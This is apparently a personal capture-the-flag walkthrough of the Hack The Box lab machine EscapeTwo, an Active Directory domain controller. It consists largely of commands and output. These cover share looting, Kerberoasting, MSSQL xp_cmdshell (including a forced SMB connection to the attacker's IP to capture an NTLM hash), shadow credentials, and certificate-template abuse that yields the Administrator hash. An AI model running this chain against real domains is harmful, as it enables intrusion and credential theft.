
Creds given: rose:KxEPkKe6R8su
## NMAP SCAN 
```
 nmap -sSCV -p- 10.129.232.128
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-21 19:53 +0700
Stats: 0:02:53 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 82.49% done; ETC: 19:56 (0:00:37 remaining)
Nmap scan report for 10.129.232.128
Host is up (0.094s latency).
Not shown: 65511 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-21 12:56:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-21T12:58:08+00:00; -3s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2026-04-21T12:58:08+00:00; -2s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.232.128:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.232.128:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-04-21T12:52:24
|_Not valid after:  2056-04-21T12:52:24
|_ssl-date: 2026-04-21T12:58:08+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2026-04-21T12:58:08+00:00; -3s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49726/tcp open  msrpc         Microsoft Windows RPC
49736/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-21T12:57:29
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 1s, median: -2s
```

ms-sql/rpc is there maybe i can login...
also can try to get tgs maybe and search using ldap to get usernames
```
 rpcclient -U 'rose' 10.129.207.84 
Password for [WORKGROUP\rose]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[michael] rid:[0x44f]
user:[ryan] rid:[0x45a]
user:[oscar] rid:[0x45c]
user:[sql_svc] rid:[0x462]
user:[rose] rid:[0x641]
user:[ca_svc] rid:[0x647]

```

got users now lets try to login in ms-sql... rose has diff pass for this 
lets try netexec smb..
```
nxc smb 10.129.207.84 -u 'rose' -p 'KxEPkKe6R8su' --shares --smb-timeout 20

SMB         10.129.207.84   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.207.84   445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.129.207.84   445    DC01             [*] Enumerated shares
SMB         10.129.207.84   445    DC01             Share           Permissions     Remark
SMB         10.129.207.84   445    DC01             -----           -----------     ------
SMB         10.129.207.84   445    DC01             Accounting Department READ            
SMB         10.129.207.84   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.207.84   445    DC01             C$                              Default share
SMB         10.129.207.84   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.207.84   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.207.84   445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.207.84   445    DC01             Users           READ       
```

can read sysvol and user... account dept is interesting lets see
```smbclient //10.129.207.84/"Accounting Department" -U 'rose%KxEPkKe6R8su'

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 17:52:21 2024
  ..                                  D        0  Sun Jun  9 17:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 17:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 17:52:07 2024

                6367231 blocks of size 4096. 851449 blocks available
smb: \> get accounts.xlsx
getting file \accounts.xlsx of size 6780 as accounts.xlsx (2.2 KiloBytes/sec) (average 2.2 KiloBytes/sec)
smb: \> get accounting_2024.xlsx
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (19.4 KiloBytes/sec) (average 4.8 KiloBytes/sec)
```
got 2 files from accounting lets try other shares as well 

accounts has username and pass
```
|   |   |   |   |   |
|---|---|---|---|---|
|First Name|Last Name|Email|Username|Password|
|Angela|Martin|[angela@sequel.htb](mailto:angela@sequel.htb)|angela|0fwz7Q4mSpurIt99|

|Oscar|Martinez|[oscar@sequel.htb](mailto:oscar@sequel.htb)|oscar|86LxLBMgEWaKUnBG|

|Kevin|Malone|[kevin@sequel.htb](mailto:kevin@sequel.htb)|kevin|Md9Wlq1E5bZnVDVo|

	|NULL|NULL|[sa@sequel.htb](mailto:sa@sequel.htb)|sa|MSSQLP@ssw0rd!|
```

got 2 tgs using rose.....
```
mpacket-GetUserSPNs sequel.htb/rose:KxEPkKe6R8su -dc-ip 10.129.207.84 -request
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName     Name     MemberOf                                              PasswordLastSet             LastLogon                   Delegation 
-----------------------  -------  ----------------------------------------------------  --------------------------  --------------------------  ----------
sequel.htb/sql_svc.DC01  sql_svc  CN=SQLRUserGroupSQLEXPRESS,CN=Users,DC=sequel,DC=htb  2024-06-09 14:58:42.689521  2026-04-22 15:08:21.484033             
sequel.htb/ca_svc.DC01   ca_svc   CN=Cert Publishers,CN=Users,DC=sequel,DC=htb          2026-04-22 15:37:29.306923  2024-06-10 00:14:42.333365             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*sql_svc$SEQUEL.HTB$sequel.htb/sql_svc*$50fb75053ab5b459d822a9660d82ceb4$0fd6aebf9a040f6f02376df9c67f986ae482e4478176a5356a7359deb0b7671f511fda20c7ae64314cc6279756c88e79d02459003e0a632d8149269e9802ff252a67f00b044b9de94a23fb5a5246f684bfdd40fe0a6d8452b45b9f5bff5ea200c5c6e6daa44eeb39adefd6fa23a5346b7b23b5e43d68cdabd42a586331c167d1b4dce917be085a4480152812ec47d4dbedffa002bbfee1a5320bb97420c912fea7277b8b007da77bb37186a3ab21bdf17f646ce6eb0d9625b763dfdb67bcab3b3e16c12c0663e3bc9ea7235eaabac846c308403e2d48b5af3d208cdb01980048ad363fca5ccc64f72732d61e4b8d38a26c80444a18adc43e3f661eff2b0b8390e42356ca2dba8c32cea2c801c608034e8646fe48fe0ee40fbdc3e0d76f53e9355fe892effbb3cb97bed30d2c2a43883cbeb08f09f9f2b0991899fa7354ccaf14d1011848a2d645996939c03b8f9ecd2cd0e7d94e3f3ddbf4dec1e7370ddcbaa0f84e675f4f393764eb016d92e529e8a3b7b45f76a9445c4a277363b1c7c0ef943a624ab08ce734868d7371abe01ea96c723f62eae3d12d40c15ae97da8fc37f9fd89ec00011727bdb4b257e04b50155e432f9f8597c1a135da1fa2121dd3a37cf7ccabe2a9ba144e087d18467f20a7e9b2379f90d95962efefbdcebfc9e1749d2284484dc1822ccb5a1ad9f2eb873d0909642972f3d5bf4fd8107cb4b08f1f947838d64c29a07ce7a6a92699d5935388ec4634537bba6af5749283332eac1d8c01932aca96bab11a8863334a712ad50ed2ccd28b591a6ce3cc578dd0a0bee84fc6df21ba50a7dd97881b3b0199b3ee2ca798667fcd2c28094e84ccdd696841a808da82cfa76230ed488d7272e052b0d7282a270a9127fbc1f2bb68a431711bdef191c23c49e7552a90fb96903017b317ead806345244ce62cc1d6608e84cfada134fa0d4641395f3f29c655fd6b52ad855f4ae655b9d8ef71de7720da537ff96fee375e69d882611f1cdbf4175e540fed7fa28b9bee24e489d5bb3c6655b51e501787c49c0b81f419dff6d2e323f4f3c429834c47ed2eea5707bea41a8405feb52dd29ee16377eb61c5d481371bbb5e12dc41108775621a5487b41d221421030746ea42a8debacfd4a448eaa434a73b8840c85e5652c8dda7c46fd0db5cc5bc839cda8cce9583cacdec7c39452381800dff55c14231d42225c5ba34536b2b08f39446439e8105461c57c4ce0d3ab286095072b60b5fa279cc44207737758f34a66f5e473eea9af02a82e11cdeb06f8785696c9c54346725de66c890bd0b95840f2b031e85053f09940475a2f449812aa1738207156485c573c26a65cf0dc4ec02d074c6b87aac0aa8716a39a2b6dc703dd3c412ff428ac0335596572b77145d8583e67935c6f631bdd6be9dd6f84e7

$krb5tgs$23$*ca_svc$SEQUEL.HTB$sequel.htb/ca_svc*$f7509b1f83d6a34b08da6cebbefdca66$f44a523d40057be74e254bcd0e137aa4c1b13785179ebdf3712fff609b03a653ddf3fa61a6cbd08950a9a3c1ec4562cfcf81cc84e773c7862ab47a381ceb63492b954768faa6b6b16ab533386ca89ae116482c35f6c01e0702f15c43024461238561d8fba4873c825f9819a3a8a86d732f9120a9ca7cf81e4d5e76e35dd2dde9f6d1023f81d57bb0b84c374c6640cd327ac29017be53a217f26faf3d95c008dc87d55b6344bbdcb5d36ee5670a5bad44d0273fc0931b190d071e78904ee56fa08dbaef13cf1f756ba427aa74473d72eee487ed0d920ef74c9095cab2164adbf7c0efc8bf3ee2bae9f37f323074b4f1beb1a1d3417ad4d2799f3253f40f6aa791a1bc49010436351a74b2053601ae11192c04649bc082436fa1664c4f3080d3a2b3c520b5c376554ea1e6fde2fb070793b0f9827c3fc79034706098da96c47e4d840429b4fa8f8954e11612ecd511864728b564134caf4ad7b9c75b1c927a5e4b30fb4387012a476992e413531f49be835f61a089ab482928639c3fc265a4dbf4569070aef67bc2b84a6618363df2006d6dc87b8bd04503f95b1275eca1746bbc336f731cb66d69b68d3e09a64cefc230246e4db1947f285bff0cdbfc97f49477d70f25bc9e4e98c02af195b1a73b5ebdf4c87d6a01be25701f6b5598199811d0e93c318a159e063c2f86a39fe865544fdd9cc6157ae6720ede0bc803a4a99239aaacbc3655693b3cfa0b7b1ea7ae64edbda15bcf52584272e7866b9cbcb4d577eb3999fa9ae487d353b48f7ed942d03de90f7d72df72c4103e95462d208bfe0de68367b884e02f522614b56a2abfd87101b0d2c634a919e1827eb3cc549de35815e3394d6988ed446580b3a5433b9333c30d56f2f416cb0194ce6cec2c4b2bb0d806c0309a4395f5f9fe557f4e44db807831667bc0108511ee903e3c0b5db2e8d398ede9e982c0ea51c9d61c8ecb02bdc4489600329fa9bdc94db1564eed5f82cbe4c203d12308f5881e2c1f40e0143599050fe29b20031a9938e517b50a8b311338cc7f8e72cbe5db38e9a0aaa7240baa3f980cc46c73391595c60596fd85bf8a983be1134533f33e08a899f000c3af2b9e2ee2c2b866a3d0c992e59785dd05cffcdaedd538283844f10a272df4f92e4c92a8dd7189ba78382b693017042d30a0577a8fe5c9dc2dfce79b568c233a1d4e579fcc0abf58c2c57675d2575e8cee8a8efc1747128a6979f5a1aa0ce03ef6e732b33f0753361d5a8f82ad24f80d253c4c2396e7965bc9f986c1e5b182060e0e0efd41428b044de1ae8f3afc2097f18f938219142ad548746a85fd3351161985c3f452fb53362bfc1d3757d444cfbb5747f2cdcd80906e5da01102033545efb5f2f908d3da039615a1a407facac81c027d831dc9025a142de961c0309eee
```

lets crack them and have their usernames...
uncrackable.... 
connect to mssql using SA 
```
SQL (sa  dbo@msdb)> xp_cmdshell "dir C:\Users
output                                                 
----------------------------------------------------   
 Volume in drive C has no label.                       
 Volume Serial Number is 3705-289D                     
NULL                                                   
 Directory of C:\Users                                 
NULL                                                   
06/09/2024  06:42 AM    <DIR>          .               
06/09/2024  06:42 AM    <DIR>          ..              
12/25/2024  04:10 AM    <DIR>          Administrator   
06/09/2024  04:11 AM    <DIR>          Public          
06/09/2024  04:15 AM    <DIR>          ryan            
06/08/2024  04:16 PM    <DIR>          sql_svc         
               0 File(s)              0 bytes          
               6 Dir(s)   3,796,668,416 bytes free   
```

got new user ryan
lets try to get ntlm (first run responder in our machine and then exec command)
```
SQL (sa  dbo@msdb)> xp_cmdshell "dir \\10.10.14.53\test"
output              
-----------------   
Access is denied.   
NULL              
```

got ntlm for sqc_svc.... 
```
[SMB] NTLMv2-SSP Client   : 10.129.207.84
[SMB] NTLMv2-SSP Username : SEQUEL\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::SEQUEL:99c8cef434be74f7:3C664616A9B37173E0D82A80B74377ED:01010000000000008089E3EB70D2DC01BE659DDD3234B091000000000200080043004E005100390001001E00570049004E002D0037004400380059004C005A00410043004C004100340004003400570049004E002D0037004400380059004C005A00410043004C00410034002E0043004E00510039002E004C004F00430041004C000300140043004E00510039002E004C004F00430041004C000500140043004E00510039002E004C004F00430041004C00070008008089E3EB70D2DC010600040002000000080030003000000000000000000000000030000051B4A758785D140A54103ADE7FFF63B173DEE071BE1BA47EDBD1C749C1B7A8CA0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00350033000000000000000000  
```

not able to crack... lets explore more 
```SQL (sa  dbo@master)> enable_xp_cmdshell
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> xp_cmdshell "dir C:\"
output                                                       
----------------------------------------------------------   
 Volume in drive C has no label.                             
 Volume Serial Number is 3705-289D                           
NULL                                                         
 Directory of C:\                                            
NULL                                                         
11/05/2022  12:03 PM    <DIR>          PerfLogs              
01/04/2025  08:11 AM    <DIR>          Program Files         
06/09/2024  08:37 AM    <DIR>          Program Files (x86)   
06/08/2024  03:07 PM    <DIR>          SQL2019               
06/09/2024  06:42 AM    <DIR>          Users                 
01/04/2025  09:10 AM    <DIR>          Windows               
               0 File(s)              0 bytes                
               6 Dir(s)   3,811,028,992 bytes free           
NULL                                                         
SQL (sa  dbo@master)> xp_cmdshell "dir C:\SQL2019"
output                                                  
-----------------------------------------------------   
 Volume in drive C has no label.                        
 Volume Serial Number is 3705-289D                      
NULL                                                    
 Directory of C:\SQL2019                                
NULL                                                    
06/08/2024  03:07 PM    <DIR>          .                
06/08/2024  03:07 PM    <DIR>          ..               
01/03/2025  08:29 AM    <DIR>          ExpressAdv_ENU   
               0 File(s)              0 bytes           
               3 Dir(s)   3,810,947,072 bytes free      
NULL                                                    
SQL (sa  dbo@master)> xp_cmdshell "dir C:\SQL2019\ExpressAdv_ENU"
output                                                            
---------------------------------------------------------------   
 Volume in drive C has no label.                                  
 Volume Serial Number is 3705-289D                                
NULL                                                              
 Directory of C:\SQL2019\ExpressAdv_ENU                           
NULL                                                              
01/03/2025  08:29 AM    <DIR>          .                          
01/03/2025  08:29 AM    <DIR>          ..                         
06/08/2024  03:07 PM    <DIR>          1033_ENU_LP                
09/24/2019  10:03 PM                45 AUTORUN.INF                
09/24/2019  10:03 PM               788 MEDIAINFO.XML              
06/08/2024  03:07 PM                16 PackageId.dat              
06/08/2024  03:07 PM    <DIR>          redist                     
06/08/2024  03:07 PM    <DIR>          resources                  
09/24/2019  10:03 PM           142,944 SETUP.EXE                  
09/24/2019  10:03 PM               486 SETUP.EXE.CONFIG           
06/08/2024  03:07 PM               717 sql-Configuration.INI      
09/24/2019  10:03 PM           249,448 SQLSETUPBOOTSTRAPPER.DLL   
06/08/2024  03:07 PM    <DIR>          x64                        
               7 File(s)        394,444 bytes                     
               6 Dir(s)   3,810,947,072 bytes free                
NULL                                                              
SQL (sa  dbo@master)> xp_cmdshell "type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI "
ERROR(DC01\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
SQL (sa  dbo@master)> EXEC sp_configure 'show advanced options', 1;
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> RECONFIGURE;
SQL (sa  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> RECONFIGURE;
SQL (sa  dbo@master)> xp_cmdshell "type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI"
output                                              
-------------------------------------------------   
[OPTIONS]                                           
ACTION="Install"                                    
QUIET="True"                                        
FEATURES=SQL                                        
INSTANCENAME="SQLEXPRESS"                           
INSTANCEID="SQLEXPRESS"                             
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"   
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"        
AGTSVCSTARTUPTYPE="Manual"                          
COMMFABRICPORT="0"                                  
COMMFABRICNETWORKLEVEL=""0"                         
COMMFABRICENCRYPTION="0"                            
MATRIXCMBRICKCOMMPORT="0"                           
SQLSVCSTARTUPTYPE="Automatic"                       
FILESTREAMLEVEL="0"                                 
ENABLERANU="False"                                  
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"         
SQLSVCACCOUNT="SEQUEL\sql_svc"                      
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"                   
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"          
SECURITYMODE="SQL"                                  
SAPWD="MSSQLP@ssw0rd!"                              
ADDCURRENTUSERASSQLADMIN="False"                    
TCPENABLED="1"                                      
NPENABLED="1"                                       
BROWSERSVCSTARTUPTYPE="Automatic"                   
IAcceptSQLServerLicenseTerms=True                   
NULL   
```
got SEQUEL\sql_svc:WqSZAF6CysDQbGb3

```
netexec smb 10.129.232.128 -u users.txt -p 'WqSZAF6CysDQbGb3'                   
SMB         10.129.232.128  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.128  445    DC01             [-] sequel.htb\michael:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.129.232.128  445    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 
```

got pass for ryan lets connect using winrm
got user flag 
```
evil-winrm -i 10.129.207.84 -u ryan -p WqSZAF6CysDQbGb3
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents> cd ..
*Evil-WinRM* PS C:\Users\ryan> cd Desktop
*Evil-WinRM* PS C:\Users\ryan\Desktop> type user.txt
8f427929e032f5a790214754d1ad916c

```

sequel.htb\ryan:WqSZAF6CysDQbGb3

noPac doesnt work here.... 

found out that we can take ownership of ca_svc 
```
impacket-owneredit -action write -new-owner ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3 -dc-ip 10.129.247.68                   

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB BOXES/EscapeTwo]
└─$ impacket-dacledit -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3 -dc-ip 10.129.247.68

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20260422-174918.bak
[*] DACL modified successfully!
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB BOXES/EscapeTwo]
└─$ certipy-ad shadow auto -u ryan -p WqSZAF6CysDQbGb3 -account ca_svc -dc-ip 10.129.247.68                              

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'e5f9622bb7b34c3b81f7f21b6e270524'
[*] Adding Key Credential with device ID 'e5f9622bb7b34c3b81f7f21b6e270524' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'e5f9622bb7b34c3b81f7f21b6e270524' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce

```

took ownership then modified dacl and got nt hash
next we modify the template....
```
certipy-ad template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration
 
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: SEQUEL.HTB.
[!] Use -debug to print a stacktrace
[*] Saving current configuration to 'DunderMifflinAuthentication.json'
[*] Wrote current configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'DunderMifflinAuthentication'? (y/N): y
[*] Successfully updated 'DunderMifflinAuthentication'

```

lets try to get admin hash now...
 ```
 certipy req -username ca_svc@sequel.htb -H 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -
template DunderMifflinAuthentication -target dc01.sequel.htb -upn
administrator@sequel.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 30
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
 ```
```
certipy auth -pfx administrator.pfx -domain sequel.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)
[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb':
aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

connected using winrm and got root